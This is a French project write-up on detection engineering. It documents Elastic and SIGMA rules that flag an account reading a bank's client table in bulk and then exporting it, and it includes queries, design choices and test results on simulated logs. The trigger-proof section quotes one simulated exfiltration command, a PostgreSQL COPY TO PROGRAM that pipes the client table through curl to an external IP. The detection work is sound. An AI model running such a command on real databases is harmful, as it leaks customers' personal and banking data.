# Use case groupe 3 : exfiltration de données clients

Azur Bank, base `core_clients` (PostgreSQL + pgaudit, zone Datacenter), Elastic Security 9.7.

## Fiche de la règle principale

| Élément | Valeur |
|---|---|
| Nom | Lecture massive base clients (`azur-bank-client-data-exfil`) |
| Objectif | Détecter un compte qui lit un volume anormal de fiches clients en peu de temps |
| Risque | Fuite de données personnelles et bancaires (RGPD, PCI DSS si données de carte), compte interne compromis ou malveillant |
| Sources | Audit PostgreSQL du serveur db-clients (`logs-db.audit-*`), corrélé avec le bastion (`logs-bastion.auth-*`) |
| Seuil / fenêtre | 500 lectures ou plus de la table `clients` par `user.name` sur 10 minutes |
| Exécution | Toutes les minutes, sur les 10 dernières minutes (fenêtre glissante) |
| Action | Alerte dans Security > Alerts, ouverture d'un Case, playbook SOAR (désactivation du compte, coupure de session, blocage IP destination) après validation de l'analyste |
| Priorité | Élevée (risk score 73). Critique (99) si un export suit |
| MITRE ATT&CK | Collection TA0009 / T1530 (énoncé), Exfiltration TA0010. Variante séquence : T1048.002 |

## Les règles livrées

| Fichier | Type | Ce qu'elle détecte | Sévérité |
|---|---|---|---|
| `regles/sigma/lecture_massive_clients.yml` | SIGMA v2 (règle de base + corrélation `event_count`) | > 500 lectures `clients` par compte en 10 min | high |
| `regles/sigma/lecture_massive_clients_enonce.yml` | SIGMA, syntaxe de l'énoncé | Idem, conservée pour référence | high |
| `regles/elastic/threshold_lecture_massive_clients.json` | Threshold (KQL) | ≥ 500 lectures `clients` par `user.name` en 10 min | high |
| `regles/elastic/eql_lecture_puis_export.json` | EQL sequence | 100 lectures `clients` puis un export, même compte, en 10 min | critical |
| `regles/elastic/esql_lecture_puis_export.json` | ES\|QL | > 500 lectures `clients` puis au moins un export, même compte, en 10 min | critical |
| `regles/elastic-basic/` | Mêmes règles | Variante pour l'instance on-prem en licence Basic (sans suppression d'alertes) | |
| `regles/elastic-basic/query_swift_virement_anormal.json` + `regles/sigma/swift_virement_anormal.yml` | Query (KQL) + SIGMA | MT103/MT202 sortant ≥ 1 M EUR, correspondant hors référentiel ou hors heures ouvrées (passerelle SWIFT via Logstash) | critical |

Requête KQL de la règle Threshold :

```
event.dataset : "db.audit" and event.action : "select" and object : "clients"
```

Séquence EQL :

```
sequence by user.name with maxspan=10m
  [any where event.dataset == "db.audit" and event.action == "select" and object == "clients"] with runs=100
  [any where event.dataset == "db.audit" and event.action == "export"]
```

## Écarts avec l'énoncé et justification

1. **Syntaxe SIGMA.** La condition `reads | count(user.name) > 500` utilise l'ancienne syntaxe d'agrégation, retirée de la spécification. `sigma convert` la refuse : « The pipe syntax in Sigma conditions has been deprecated and replaced by Sigma correlations ». La version livrée utilise une règle de corrélation SIGMA v2 (`type: event_count`, `group-by: user.name`, `timespan: 10m`, `gt: 500`). Elle passe `sigma check` sans erreur et se convertit en EQL et ES|QL avec pySigma (backend Elasticsearch).
2. **`with runs=500` en EQL.** Elasticsearch refuse la requête : `parsing_exception: A query cannot be repeated more than 100 times; found [500]`. La séquence EQL utilise donc `runs=100` (signal « lecture en rafale puis export »). Le seuil exact de 500 est porté par la règle Threshold et par la règle ES|QL, qui compte les lectures puis vérifie l'export.
3. **MITRE.** T1530 appartient à la tactique Collection (TA0009) dans ATT&CK. Les règles gardent les deux tags de l'énoncé (T1530 et TA0010) avec un mapping valide : TA0009/T1530 + TA0010, et T1048.002 pour l'export chiffré vers une IP externe.
4. **Fréquence d'exécution.** Une règle Threshold compte sur toute sa fenêtre d'analyse, pas sur une fenêtre glissante. Avec l'exécution par défaut (toutes les 5 min), une rafale de 8 min peut être coupée en deux et passer sous le seuil. La règle tourne donc toutes les minutes sur 10 min, avec une suppression des doublons sur 30 min. La suppression d'alertes demande une licence Platinum : en licence Basic (instance on-prem, `elastic-basic/`), on s'en passe. La règle Threshold ne réalerte pas sur les événements déjà comptés, et l'EQL ne recrée pas une séquence déjà signalée. L'ES|QL, elle, réalertait à chaque minute tant que l'export restait dans la fenêtre de 10 min (3 alertes au premier essai) : la variante Basic ne garde que l'export tombé dans l'avant-dernière minute. Testé le 6 novembre : une alerte par règle pour une exfiltration.

## Preuve de déclenchement (5 novembre 2026)

Jeu de données : 3644 événements `db.audit`, 3060 `nginx.access`, 647 `bastion.auth`.

Activité du compte c.dupont (IP 10.20.30.47) :
- 603 lectures de `clients` entre 14:01:08 et 14:09:06 UTC (environ 75 par minute) ;
- 1 export à 14:09:27 UTC : `COPY clients TO PROGRAM 'curl -T - https://185.220.101.34/u'`, destination 185.220.101.34:443. C'est le seul export de l'index.

Exécution manuelle des 3 règles sur 13:46 à 14:24 UTC :

| Règle | Compte | Sévérité | Détail |
|---|---|---|---|
| Lecture massive base clients (Threshold) | c.dupont | high | 528 lectures comptées depuis 14:01:08 |
| Lecture massive base clients puis export (ES\|QL) | c.dupont | critical | 603 lectures, 1 export, 10.20.30.47 vers 185.220.101.34 |
| Lecture massive base clients puis export (EQL) | c.dupont | critical | 1 alerte de séquence (100 lectures + export), 99 alertes « building block » masquées par défaut |

Aucun autre compte ne dépasse le seuil : le deuxième plus gros lecteur de `clients` sur 24 h (j.leroy) en fait 169 sur toute la journée.

## Déploiement

```
cd "projet-elastic/03 - Détection (use case et règles)/regles/scripts"
export ES_URL=https://<projet>.es.<region>.elastic.cloud:443
export ES_API_KEY=...          # jamais dans un fichier
python3 regles.py check        # données, fenêtre de l'exfiltration, EQL, ES|QL
python3 regles.py deploy       # crée ou met à jour les règles de ../elastic
python3 regles.py run 2026-11-05T13:46:00.000Z 2026-11-05T14:25:00.000Z
python3 regles.py alerts
```

Pour une démo en direct : `python3 ../../scripts/gen_logs_banque.py --attack-now` (depuis `regles/scripts`), puis attendre une à deux minutes.

## Limites et pistes

- En production, l'agent doit extraire `event.action` et `object` des lignes pgaudit (pipeline d'ingestion). Sans ces champs, les règles ne voient rien.
- Le champ `object` n'est pas un champ ECS. On pourrait le remplacer par `db.table` ou un champ personnalisé `azurbank.db.object`.
- Exclure les comptes de service batch (CRM, reporting) par une exception, pour limiter les faux positifs.
- Évolution possible : remplacer le seuil fixe par une règle Machine Learning sur le volume de lecture habituel de chaque compte.
